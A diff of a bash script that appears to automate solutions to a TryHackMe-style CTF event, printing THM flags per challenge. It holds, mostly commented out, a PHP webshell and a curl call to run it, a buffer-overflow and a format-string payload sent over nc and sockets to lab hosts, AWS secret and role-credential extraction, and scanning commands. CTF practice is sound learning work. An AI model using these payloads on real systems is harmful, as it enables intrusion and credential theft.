@@ -49,7 +49,7 @@ echo "--> Flag is '$FLAG'"
 points=$((points + 30))
 
 echo "6 - DARK ENCRYPTOR 2"
-#target_ip="10.10.174.217"
+#target_ip="10.10.84.199"
 #SHELL=webshell.txt
 #echo "<?php" > $result_folder/$SHELL
 #echo "    system(\$_GET[\"cmd\"]);" >> $result_folder/$SHELL
@@ -58,18 +58,18 @@ echo "6 - DARK ENCRYPTOR 2"
 #curl -s -X GET http:/$target_ip/uploads/$SHELL?cmd=find+/+-type+f+-name+"flag.txt" -o $result_folder/path.txt
 
 echo "7 - ORDER"
-TEXT="1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f63731a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60"
-KNOWN="ORDER:"
-python3 $scriptpath/xor.py $TEXT $KNOWN
+#TEXT="1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f63731a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60"
+#KNOWN="ORDER:"
+#python3 $scriptpath/xor.py $TEXT $KNOWN
 points=$((points + 30))
 
 echo "8 - DARK MATTER"
 # In /tmp, there is the public key, given by n=340282366920938460843936948965011886881 and e=65537 which is weak. 
-curl -s -X GET https://factordb.com/index.php?query=340282366920938460843936948965011886881 -o $result_folder/factor.html
-P=$(cat $result_folder/factor.html | sed -n 's/.*294466838"><font color="#000000">\([^<]*\).*/\1/p')
-Q=$(cat $result_folder/factor.html | sed -n 's/.*<font color="#000000">\([^<]*\).*/\1/p')
-echo "--> P is '$P' and Q is '$Q'"
-python3 $scriptpath/rsa.py $P $Q 65537
+#curl -s -X GET https://factordb.com/index.php?query=340282366920938460843936948965011886881 -o $result_folder/factor.html
+#P=$(cat $result_folder/factor.html | sed -n 's/.*294466838"><font color="#000000">\([^<]*\).*/\1/p')
+#Q=$(cat $result_folder/factor.html | sed -n 's/.*<font color="#000000">\([^<]*\).*/\1/p')
+#echo "--> P is '$P' and Q is '$Q'"
+#python3 $scriptpath/rsa.py $P $Q 65537
 points=$((points + 30))
 
 echo "9 - GHOST PHISHING"
@@ -80,8 +80,8 @@ points=$((points + 15))
 echo "10 - DUMP"
 target_ip="10.10.193.83"
 #nmap -sC -sV -sS -T4 -F ${target_ip} > $result_folder/nmap-results.txt
-cat $scriptpath/##Dump##.txt | grep NTLM | awk '{print $4}' > $result_folder/john_ntlm.txt
-cat $scriptpath/##Dump##.txt | grep SHA1 | awk '{print $4}' > $result_folder/john_sha1.txt
+#cat $scriptpath/##Dump##.txt | grep NTLM | awk '{print $4}' > $result_folder/john_ntlm.txt
+#cat $scriptpath/##Dump##.txt | grep SHA1 | awk '{print $4}' > $result_folder/john_sha1.txt
 
 echo "11 - SHADOW PHISHING"
 # To find the name of the executable, go to https://sourceforge.net/projects/silenteye/ and download it
@@ -130,7 +130,7 @@ echo "--> Flag is $FLAG"
 points=$((points + 60))
 
 echo "14 - THE GAME"
-unzip -u $scriptpath/Tetrix.exe-1741979048280.zip -d $result_folder/ > /dev/null 2> /dev/null
+#unzip -u $scriptpath/Tetrix.exe-1741979048280.zip -d $result_folder/ > /dev/null 2> /dev/null
 FLAG=$(cat $result_folder/Tetrix.exe | grep -a -o 'THM{[^}]*}')
 echo "--> Flag is $FLAG"
 # Just open the file with a text editor and look for THM{ in it
@@ -177,6 +177,115 @@ echo "21 - SNEAKY PATCH"
 # Going through module strings with strings /lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko | grep CIPHER gives us the 
 # hex value of the flag
 points=$((points + 30))
+
+echo "22 - HIDE AND SEEK"
+# crontab -e contains echo " " | base64 -d which leads to an hexadecimal value standing for THM{y0 
+# sudo cat /home/zeroday/.ssh/.authorized_keys contains ssh key belonging to 326e6420706172743a20755f6730745f.local. Hex value stands for u_g0t_  
+# in /home/specter/.bashrc (when specter sets the stage...) we find an nc command with 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io. Unhex, then unbase64 gives 3rd_p4rt: 3v3ryt
+# crontab -l shows the opening of a vnc server on port 5901 at reboot. Should be located to it but did not find it... guessed from the other parts
+# In  /etc/update-motd.d/00-header, an hexadecimal in the python command gives final part : d0wn}
+points=$((points + 30))
+   
+echo "23 - SEQUEL DUMP"
+#python3 $scriptpath/sequel_dump.py $scriptpath/challenge.pcapng 6
+points=$((points + 90))
+
+echo "25 - CIPHER SECRET MESSAGE"
+points=$((points + 30))
+
+echo "26 - CRYPTOSYSTEM"
+#python3 $scriptpath/cryptosystem.py
+points=$((points + 30))
+
+echo "27 - FLAG VAULT"
+#target_ip="10.10.165.115"
+#echo -en "bytereaper\x00" > $result_folder/vault.txt
+#for (( i=1; i<=101; i++ ))
+#do
+#  echo -en " " >> $result_folder/vault.txt
+#done
+#echo -e "5up3rP4zz123Byte" >> $result_folder/vault.txt
+#cat $result_folder/vault.txt | nc 10.10.143.84 1337 > $result_folder/vault-result.txt
+FLAG=$(cat $result_folder/vault-result.txt | grep -a -o 'THM{[^}]*}')
+echo "--> Flag is '$FLAG'"
+points=$((points + 30))
+
+echo "28 - FLAG VAULT 2"
+#target_ip="10.10.37.187"
+#python3 -c "import sys, socket; s = socket.create_connection(('$target_ip', 1337)); s.sendall(b\"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p\n\"); print(s.recv(8092).decode()); s.close()"
+points=$((points + 30))
+
+echo "29 - CLOUD SANITY CHECK"
+#python3 $scriptpath/aws.py > $result_folder/services.txt
+#aws secretsmanager list-secrets > $result_folder/secrets.txt
+#ID=$(cat $result_folder/secrets.txt | grep ARN | sed -n 's/.*ARN": "\(.*\)".*/\1/p')
+#aws secretsmanager get-secret-value --secret-id $ID > $result_folder/flag.txt
+FLAG=$(cat $result_folder/flag.txt | grep -a -o 'THM{[^}]*}')
+echo "--> Flag is '$FLAG'"
+points=$((points + 30))
+
+echo "30 - A BUCKET OF PHISH"
+#aws configure set aws_access_key_id "A------------------W"
+#aws configure set aws_secret_access_key "p--------------------------------------r"
+#aws configure set region "us-west-2"
+#aws s3 cp s3://darkinjector-phish/captured-logins-093582390 --region us-west-2 $result_folder/captured-logins > /dev/null
+FLAG=$(cat $result_folder/captured-logins | grep -a -o 'THM{[^}]*}')
+echo "--> Flag is '$FLAG'"
+points=$((points + 30))
+
+echo "31 - ENCRYPTED DATA"
+#aws configure set aws_access_key_id "A-----------------W"
+#aws configure set aws_secret_access_key "V--------------------------------------H"
+#aws configure set region "us-west-2"
+#aws s3 cp s3://secret-messages/20250301.msg.enc --region us-west-2 $result_folder/20250301.msg.enc > /dev/null
+#KEY=$(cat $result_folder/20250301.msg.enc | sed -n 's/.*"KeyId": "\(.*\)".*/\1/p')
+#MESSAGE=$(cat $result_folder/20250301.msg.enc | sed -n 's/.*"CiphertextBlob": "\(.*\)".*/\1/p')
+#aws iam list-roles > $result_folder/roles.txt
+#aws sts assume-role --role-arn "arn:aws:iam::332173347248:role/crypto-master" --role-session-name session1 > $result_folder/temp_credentials.txt
+#ACCESS_ID=$(cat $result_folder/temp_credentials.txt | sed -n 's/.*"AccessKeyId": "\(.*\)".*/\1/p')
+#SECRET_KEY=$(cat $result_folder/temp_credentials.txt | sed -n 's/.*"SecretAccessKey": "\(.*\)".*/\1/p')
+#TOKEN=$(cat $result_folder/temp_credentials.txt | sed -n 's/.*"SessionToken": "\(.*\)".*/\1/p')
+#export AWS_ACCESS_KEY_ID=$ACCESS_ID
+#export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
+#export AWS_SESSION_TOKEN=$TOKEN
+#echo "$MESSAGE" | base64 --decode | aws kms decrypt --ciphertext-blob fileb:///dev/stdin --key-id $KEY --output text --query Plaintext | base64 --decode > $result_folder/flag.txt
+FLAG=$(cat $result_folder/flag.txt | grep -a -o 'THM{[^}]*}')
+echo "--> Flag is '$FLAG'"
+#unset AWS_ACCESS_KEY_ID
+#unset AWS_SECRET_ACCESS_KEY
+#unset AWS_SESSION_TOKEN
+points=$((points + 60))
+
+
+
+echo "32 - AVENGERS HUB"
+target_ip="10.10.16.24"
+#nmap -sC -sV -sS -T4 -F ${target_ip} > $result_folder/nmap-results.txt
+#gobuster dir -u http://$target_ip:80 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -o $result_folder/gobuster-results.txt
+
+
+echo "33 - COMPUTE MAGIC"
+#target_ip="10.10.67.81"
+#python3 $scriptpath/magic.py > $result_folder/input.txt
+#INPUT=$(cat $result_folder/input.txt)
+#printf "%s" "$INPUT" | nc $target_ip 9003 > $result_folder/magic.txt
+FLAG=$(cat $result_folder/magic.txt | grep -a -o 'THM{[^}]*}')
+echo "--> Flag is '$FLAG'"
+points=$((points + 30))
+
+echo "34 - OLD AUTHENTICATION"
+target_ip=""
+#python3 $scriptpath/oldauth.py > $result_folder/input.txt
+#INPUT=$(cat $result_folder/input.txt)
+#printf "%s" "$INPUT" | nc $target_ip 9002 > $result_folder/magic.txt
+#FLAG=$(cat $result_folder/magic.txt | grep -a -o 'THM{[^}]*}')
+#echo "--> Flag is '$FLAG'"
+
+
+echo "37 - SERVERLESS"
+aws configure set aws_access_key_id "A------------------S"
+aws configure set aws_secret_access_key "0--------------------------------------V"
+aws configure set region "us-east-1"
 
 
 
